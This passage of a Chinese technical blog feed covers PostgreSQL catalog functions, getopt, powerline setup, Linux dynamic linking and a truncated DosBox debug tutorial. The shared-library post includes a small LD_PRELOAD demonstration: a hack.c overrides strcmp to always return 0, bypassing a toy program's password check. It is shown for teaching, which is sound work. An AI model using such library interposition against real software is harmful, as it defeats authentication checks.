20”“两个参数，明显我们这里写错了，找到了原因，我们修改为我们对应的参数个数和类型：</p><p>17–具有默认值的参数个数<br>17–返回值的数据类型</p><p>“25 20 20”–函数参数的数据类型的数组，这只包括输入参数（含INOUT和VARIADIC参数），因此也表现了函数的调用特征 重载函数也凭这区别，如果有多个，参数肯定不同，这个不同即可以是数量不同，也可以是类型不同，25 20 20 就是代表类型，如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TEST=# select oid,typname from pg_type where oid in (1082,23,1114,1184,17,25);</span><br><span class="line"> OID  |   TYPNAME   </span><br><span class="line">------+-------------</span><br><span class="line">   17 | BYTEA</span><br><span class="line">   23 | INT4</span><br><span class="line">   25 | TEXT</span><br><span class="line"> 1082 | DATE</span><br><span class="line"> 1114 | TIMESTAMP</span><br><span class="line"> 1184 | TIMESTAMPTZ</span><br></pre></td></tr></table></figure><blockquote><p><strong>null</strong>–函数参数的数据类型的数组，这包括所有参数（含OUT和INOUT参数）。但是，如果所有参数都是IN参数，这个域将为空。注意下标是从1开始 ，然而由于历史原因proargtypes的下标是从0开始</p><p><strong>null</strong>–函数参数的模式的数组。编码为： i表示IN参数 ， o表示OUT参数， b表示INOUT参数， v表示VARIADIC参数， t表示TABLE参数。 如果所有的参数都是IN参数，这个域为空。注意这里的下标对应着proallargtypes而不是proargtypes中的位置</p><p><strong>null</strong>–函数参数的名字的数组。没有名字的参数在数组中设置为空字符串。如果没有一个参数有名字，这个域为空。注意这里的下标对应着proallargtypes而不是proargtypes中的位置</p><p><strong>null</strong>–默认值的表达式树（按照nodeToString()的表现方式）。这是一个pronargdefaults元素的列表，对应于最后N个input参数（即最后N个proargtypes位置）。如果没有一个参数具有默认值，这个域为空</p><p><strong>null</strong>–数据类型OID为了应用转换</p></blockquote></li></ul><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><ol><li>关闭Pg服务 <code>pg_ctl</code> </li><li>重新编译源代码 ; <code>make  &amp;&amp; make install</code>  </li><li>重新创建新的数据集簇  <code>initdb -D test; createdb test</code></li><li><code>pg_ctl start -D test</code></li><li>登陆psql 进行验证<code>select return_pid();</code></li></ol><h4 id="补充"><a href="#补充" class="headerlink" title="补充:"></a>补充:</h4><p>关于OID:</p><ol><li>OID不能重复,但是可以自己任意YY</li><li>如果不知道哪些可用，在<code>src/include/catalog</code> 下有个脚本文件 <code>unused_oids</code>，运行一下就能找出哪些oid可用，但要这是一个linux脚本，需要在linux下运行。 </li></ol>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>getopt</title>
      <link href="/2018/08/15/cpluscplus/unistd-getopt/"/>
      <url>/2018/08/15/cpluscplus/unistd-getopt/</url>
      
        <content type="html"><![CDATA[<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><ul><li><p>函数原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getopt</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">const</span> <span class="keyword">char</span> * optstring)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>函数头文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>函数说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getopt函数主要用来解析命令行参数; 从其形参argc, argv可以发现是有main()传递的参数个数与内容； 而其第三个参数optsreing 则表示处理选项字符串规则。 以冒号表示参数; </span><br><span class="line"> 1. 身后不带冒号， 则不需要填充参数</span><br><span class="line"> 2. 一个冒号，则选项后必须跟有参数</span><br><span class="line"> 3. 两个冒号，则选项之后的参数是可选的。 若存在参数，参数与选项之间不能存在空格;</span><br></pre></td></tr></table></figure></li></ul><p><br><br><a id="more"></a></p><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p><code>a:b:cd::e</code>这就是一个选项字符串。对应到命令行就是<code>-a</code> ,<code>-b</code> ,<code>-c</code> ,<code>-d</code>, <code>-e</code> ; 按照上面规则进行分解</p><ul><li><p>不带参数的选项:<code>c</code>  <code>e</code></p></li><li><p>带一个参数的选项: <code>a</code>   <code>b</code></p></li><li><p>可选参数选项:  <code>d</code></p></li></ul><p><strong>测试代码如下:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>*argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>((ch = getopt(argc, argv, <span class="string">"a:b:cd::e"</span>)) != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span>(ch)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"options a = %s\n"</span>, optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"options b = %s\n"</span>, optarg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'c'</span>:</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"options c = %s\n"</span>, optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"options d = %s\n"</span>, optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"options e = %s\n"</span>, optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span> :</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"other option : %c\n"</span>, ch);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试</strong></p><ul><li><p>正常输入选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Postgre@yfslcentos71 code]$ ./getopt -a 123 -b1 -c -d  -e</span><br><span class="line">options a = 123</span><br><span class="line">options b = 1</span><br><span class="line">options c = (null)</span><br><span class="line">options d = (null)</span><br><span class="line">options e = (null)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>不存在选项</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[Postgre@yfslcentos71 code]$ ./getopt -a 123 -b1 -c -d  -f </span><br><span class="line">options a = 123</span><br><span class="line">options b = 1</span><br><span class="line">options c = (null)</span><br><span class="line">options d = (null)</span><br><span class="line">./getopt: invalid option -- 'f'</span><br><span class="line">other option : ?</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>必须带一个参数选项不加参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Postgre@yfslcentos71 code]$ ./getopt -a  -b1 -c -d  -e</span><br><span class="line">options a = -b1</span><br><span class="line">options c = (null)</span><br><span class="line">options d = (null)</span><br><span class="line">options e = (null)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>给不带参数选项 添加参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Postgre@yfslcentos71 code]$ ./getopt -a 12  -b1 -c 34  -d  -e 56</span><br><span class="line">options a = 12</span><br><span class="line">options b = 1</span><br><span class="line">options c = (null)</span><br><span class="line">options d = (null)</span><br><span class="line">options e = (null)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>可选参数选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Postgre@yfslcentos71 code]$ ./getopt -a 12  -b1 -c  -d  1 -e  ## 可选参数 与 值 不能加空格</span><br><span class="line">options a = 12</span><br><span class="line">options b = 1</span><br><span class="line">options c = (null)</span><br><span class="line">options d = (null)</span><br><span class="line">options e = (null)</span><br><span class="line">[Postgre@yfslcentos71 code]$ </span><br><span class="line">[Postgre@yfslcentos71 code]$ ./getopt -a 12  -b1 -c  -d12 -e  ## 可选参数 与 值 不能加空格</span><br><span class="line">options a = 12</span><br><span class="line">options b = 1</span><br><span class="line">options c = (null)</span><br><span class="line">options d = 12</span><br><span class="line">options e = (null)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Centos7 bash 安装powerline</title>
      <link href="/2018/07/17/software/Centos7-bash-%E5%AE%89%E8%A3%85powerline/"/>
      <url>/2018/07/17/software/Centos7-bash-%E5%AE%89%E8%A3%85powerline/</url>
      
        <content type="html"><![CDATA[<h4 id="安装powerline"><a href="#安装powerline" class="headerlink" title="安装powerline"></a>安装powerline</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install epel-release</span><br><span class="line">sudo yum install python-pip</span><br><span class="line">pip install powerline-status</span><br></pre></td></tr></table></figure><h4 id="查看安装位置-pip-show-powerline-status"><a href="#查看安装位置-pip-show-powerline-status" class="headerlink" title="查看安装位置 pip show powerline-status"></a>查看安装位置 <code>pip show powerline-status</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Name: powerline-status</span><br><span class="line">Version: 2.7</span><br><span class="line">Summary: The ultimate statusline/prompt utility.</span><br><span class="line">Home-page: https://github.com/powerline/powerline</span><br><span class="line">Author: Kim Silkebaekken</span><br><span class="line">Author-email: kim.silkebaekken+vim@gmail.com</span><br><span class="line">License: MIT</span><br><span class="line">Location: /usr/lib/python2.7/site-packages</span><br><span class="line">Requires: </span><br><span class="line">Required-by:</span><br></pre></td></tr></table></figure><p><br><br><a id="more"></a></p><h4 id="在-Bash-Shell-中添加-启用-Powerline"><a href="#在-Bash-Shell-中添加-启用-Powerline" class="headerlink" title="在 Bash Shell 中添加/启用 Powerline"></a>在 Bash Shell 中添加/启用 Powerline</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if [ -f `which powerline-daemon` ]; then</span><br><span class="line">  powerline-daemon -q</span><br><span class="line">  POWERLINE_BASH_CONTINUATION=1</span><br><span class="line">  POWERLINE_BASH_SELECT=1</span><br><span class="line">  . /usr/lib/python2.7/site-packages/powerline/bindings/bash/powerline.sh</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h4 id="vim启用Powerline"><a href="#vim启用Powerline" class="headerlink" title="vim启用Powerline"></a>vim启用Powerline</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; vi ~/.vimrc</span><br><span class="line">set  rtp+=/usr/lib/python2.7/site-packages/powerline/bindings/vim/</span><br><span class="line">set laststatus=2</span><br><span class="line">set t_Co=256</span><br></pre></td></tr></table></figure><h4 id="解决不能显示git分支问题"><a href="#解决不能显示git分支问题" class="headerlink" title="解决不能显示git分支问题"></a>解决不能显示git分支问题</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.config/powerline</span><br><span class="line">cat &lt;&lt;-'EOF' &gt; ~/.config/powerline/config.json</span><br><span class="line">&#123;</span><br><span class="line">    "ext": &#123;</span><br><span class="line">        "shell": &#123;</span><br><span class="line">            "theme": "default_leftonly"</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">powerline-daemon --replace</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux-共享库</title>
      <link href="/2018/06/28/rebuild/Linux-%E5%85%B1%E4%BA%AB%E5%BA%93/"/>
      <url>/2018/06/28/rebuild/Linux-%E5%85%B1%E4%BA%AB%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p><strong>ld.so</strong>是<a href="https://zh.wikipedia.org/wiki/Unix" target="_blank" rel="noopener">Unix</a>或<a href="https://zh.wikipedia.org/wiki/%E7%B1%BBUnix%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">类Unix系统</a>上的<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%99%A8&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">动态链接器</a>，常见的有两个变体：</p><ul><li>ld.so针对<a href="https://zh.wikipedia.org/wiki/A.out" target="_blank" rel="noopener">a.out</a>格式的二进制可执行文件</li><li>ld-linux.so针对<a href="https://zh.wikipedia.org/wiki/ELF" target="_blank" rel="noopener">ELF</a>格式的二进制可执行文件<ul><li><code>readelf</code>显示elf文件</li><li><code>objdump</code>显示elf和object格式文件</li></ul></li></ul><p>当应用程序需要使用<a href="https://zh.wikipedia.org/wiki/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93" target="_blank" rel="noopener">动态链接库</a>里的函数)时，由ld.so负责加载。搜索动态链接库的顺序依此是</p><ul><li><p><a href="https://zh.wikipedia.org/wiki/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F" target="_blank" rel="noopener">环境变量</a>LD_AOUT_LIBRARY_PATH（<a href="https://zh.wikipedia.org/wiki/A.out" target="_blank" rel="noopener">a.out</a>格式）、LD_LIBRARY_PATH（<a href="https://zh.wikipedia.org/wiki/ELF" target="_blank" rel="noopener">ELF</a>格式）；在<a href="https://zh.wikipedia.org/wiki/Linux" target="_blank" rel="noopener">Linux</a>中，LD_PRELOAD指定的目录具有最高优先权<a href="https://zh.wikipedia.org/wiki/Ld.so#cite_note-%E6%89%BE%E5%87%BA%E5%B9%B6%E4%BF%9D%E6%8A%A4%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%85%A5%E5%8F%A3-1" target="_blank" rel="noopener">[1]</a>。</p></li><li><p><a href="https://zh.wikipedia.org/wiki/%E7%BC%93%E5%AD%98" target="_blank" rel="noopener">缓存</a>文件/etc/ld.so.cache。此为上述环境变量指定目录的二进制索引文件。更新缓存的命令是<a href="https://zh.wikipedia.org/w/index.php?title=Ldconfig&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">ldconfig</a>。</p></li><li><p>默认目录，先在/lib中寻找，再到/usr/lib中寻找。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通常:</span><br><span class="line">/lib  软连接到 /usr/lib</span><br><span class="line">/lib64 软连接到 /usr/lib64</span><br></pre></td></tr></table></figure></li></ul><p><br><br><a id="more"></a></p><h4 id="ldconfig"><a href="#ldconfig" class="headerlink" title="ldconfig"></a>ldconfig</h4><p>ldconfig命令的用途主要是在默认搜寻目录/lib和/usr/lib以及动态库配置文件/etc/ld.so.conf内所列的目录下，搜索出可共享的动态链接库（格式如lib<em>.so</em>）,进而创建出动态装入程序(ld.so)所需的连接和缓存文件。缓存文件默认为/etc/ld.so.cache，此文件保存已排好序的动态链接库名字列表。</p><p><br></p><h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Usage: ldconfig [OPTION...]</span><br><span class="line">Configure Dynamic Linker Run Time Bindings.</span><br><span class="line"></span><br><span class="line">  -c, --format=FORMAT        Format to use: new, old or compat (default)</span><br><span class="line">  -C CACHE                   Use CACHE as cache file</span><br><span class="line">  -f CONF                    Use CONF as configuration file</span><br><span class="line">  -i, --ignore-aux-cache     Ignore auxiliary cache file</span><br><span class="line">  -l                         Manually link individual libraries.</span><br><span class="line">  -n                         Only process directories specified on the command</span><br><span class="line">                             line.  Don't build cache.</span><br><span class="line">  -N                         Don't build cache</span><br><span class="line">  -p, --print-cache          Print cache</span><br><span class="line">  -r ROOT                    Change to and use ROOT as root directory</span><br><span class="line">  -v, --verbose              Generate verbose messages</span><br><span class="line">  -X                         Don't generate links</span><br><span class="line">  -?, --help                 Give this help list</span><br><span class="line">      --usage                Give a short usage message</span><br><span class="line">  -V, --version              Print program version</span><br></pre></td></tr></table></figure><p><br></p><h4 id="修改注意事项"><a href="#修改注意事项" class="headerlink" title="修改注意事项"></a>修改注意事项</h4><ol><li>执行ldconfig时会读取/etc/ld.so.conf 按照其中引用包含的路径，进行加载 lib.so 文件,并生成到 /etc/ld.so.cache 临时缓冲文件中。</li><li>当往ld.so.conf包含的路径中添加共享库时，不需要修改ld.so.conf文件，只需要执行ldconfig重新更新/etc/ld.so.cache 缓冲文件即可</li><li>程序运行时，需要查找相应的lib.so, 可以直接修改/etc/ld.so.conf; 将lib目录引用，在ldconfig重新更新，编译运行时lib才能被找到。</li><li>如果并不放置ld.so.conf引用目录，也不修改ld.so.conf。 那么还可以使用export LD_LIBRARY_PATH变量。运行程序时会自动查找。</li><li>ldconfig仅仅与运行时有关，提供函数定义so。 编译时还是需要添加<code>-L</code> ;</li></ol><p><br></p><h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a><a href="https://blog.csdn.net/haoel/article/details/1602108" target="_blank" rel="noopener">LD_PRELOAD</a></h4><p>​    所谓链接，也就是说<strong>编译器找到程序中所引用的函数或全局变量所存在的位置</strong>。一般来说，程序的链接分为静态链接和动态链接，<strong>静态链接就是把所有所引用到的函数或变量全部地编译到可执行文件中</strong>。<strong>动态链接则不会把函数编译到可执行文件中，而是在程序运行时动态地载入函数库，也就是运行链接。所以，对于动态链接来说，必然需要一个动态链接库。</strong> 动态链接库的好处在于，一旦动态库中的函数发生变化，对于可执行程序来说是透明的，可执行程序无需重新编译。</p><p>​    动态链接所带来的坏处和其好处一样同样是巨大的。因为程序在运行时动态加载函数，这也就为他人创造了可以影响你的主程序的机会。试想，一旦，你的程序动态载入的函数不是你自己写的，而是载入了别人的有企图的代码，通过函数的返回值来控制你的程序的执行流程，那么，你的程序也就被人“劫持”了。</p><p>​    在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（<strong>Runtime linker</strong>），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。<em>通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以</em>以此功能来使用自己的或是更好的函数（无需别人的源码）<em>，而另一方面，</em>我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。</p><p>​    我们知道，Linux的用的都是glibc，有一个叫libc.so.6的文件，这是几乎所有Linux下命令的动态链接中，其中有标准C的各种函数。对于GCC而言，<em>默认情况下，所编译的程序中对标准<strong>C</strong>函数的链接，都是通过动态链接方式来链接<strong>libc.so.6</strong>这个函数库的。</em></p><p>以下程序修改strcmp来达到攻击效果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// main.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *passwd = <span class="string">"passwd"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Usage: argv = %d\n"</span>, argc); </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">strcmp</span>(passwd, argv[<span class="number">1</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Usage: passwd !=  %s\n "</span>, argv[<span class="number">1</span>]); </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"Usage: passwd == %s\n "</span>, argv[<span class="number">1</span>]); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc main.c -o main</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///hack.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> </span><br><span class="line"><span class="built_in">strcmp</span>(<span class="keyword">const</span> <span class="keyword">char</span> *v1, <span class="keyword">const</span> <span class="keyword">char</span> *v2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -shared -o hack.so hack.c</code></p><p><code>export LD_PRELOAD=&#39;./hack.so&#39;</code></p><p>再次运行./main pas  将会发现我们的函数执行流程被改变。  <code>export LD_PRELOAD=</code> 将被切换回来;</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 环境变量 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Dosbox 教程</title>
      <link href="/2018/06/27/asm/Dosbox-%E6%95%99%E7%A8%8B/"/>
      <url>/2018/06/27/asm/Dosbox-%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>安装Dosbox</li><li>Debug基本参数</li></ul><a id="more"></a><p><br></p><h4 id="DosBox安装"><a href="#DosBox安装" class="headerlink" title="DosBox安装"></a>DosBox安装</h4><p>下载<a href="https://pan.baidu.com/s/11Mqt1g7-M0p5b_C77PqPTw" target="_blank" rel="noopener">DosBox</a></p><ol><li><p>解压到C盘，并运行安装 <code>DOSBox0.74-win32-installer.exe</code></p></li><li><p>将debug所在文件夹放置到<code>%PATH%</code>系统环境变量中</p></li><li><p>打开Dosbox软件</p><p><img src="/img/asm/DosBox_index.png" alt=""></p><p><img src="/img/asm/DosBox_help.png" alt="help"></p><ol><li>运行Debug组件, 首先将Debug 程序挂载到DosBox 运行环境中<ol><li><code>mount c c:\AsmTools</code>    此处的<code>C:\AsmTools</code> 为之前debug解压路径; </li><li>挂载成功之后，显示 <code>Drice C is mounted as local Directory c:\AsmTools\</code></li><li>切换盘符， <code>c:</code>  , 用于运行 debug 程序</li><li>此时即可运行 Debug </li></ol></li></ol></li></ol><h4 id="DOSBox-Debug-调试使用参数"><a href="#DOSBox-Debug-调试使用参数" class="headerlink" title="DOSBox  Debug 调试使用参数"></a>DOSBox  Debug 调试使用参数</h4><pre><code>1. *Debug:A（汇编） 　　直接将 8086/8087/8088 记忆码合并到内存。 　　该命令从汇编语言语句创建可执行的机器码。所有数值都是十六进制格式，必须按一到四个字符输入这些数值。在引用的操作代码（操作码）前指定前缀记忆码（注WINDOWS中debug命令会报错属正常现象） 　　a [address] 　　参数 　　address 　　指定键入汇编语言指令的位置。对 address 使用十六进制值，并键入不以“h”字符结尾的每个值。如果不指定地址，a 将在它上次停止处开始汇编。 　　2.Debug:C（比较） 比较内存的两个部分。 　　c range address 　　参数 　　range 　　指定要比较的内存第一个区域的起始和结束地址，或起始地址和长度。　　3. *Debug（转储） 显示一定范围内存地址的内容。 　　d [range] 　　参数 　　range 　　指定要显示其内容的内存区域的起始和结束地址，或起始地址和长度。如果不指定 range，Debug 程序将从以前 d 命令中所指定的地址范围的末尾开始显示 128 个字节的内容。4. *Debug:E（键入） 将数据输入到内存中指定的地址。　　可以按十六进制或 ASCII 格式键入数据。以前存储在指定位置的任何数据全部丢失。 　　e address 　　参数 　　address 　　指定输入数据的第一个内存位置。 　　list 　　5.Debug:F（填充） 使用指定的值填充指定内存区域中的地址。 　　可以指定十六进制或 ASCII 格式表示的数据。任何以前存储在指定位置的数据将会丢失。 　　f range 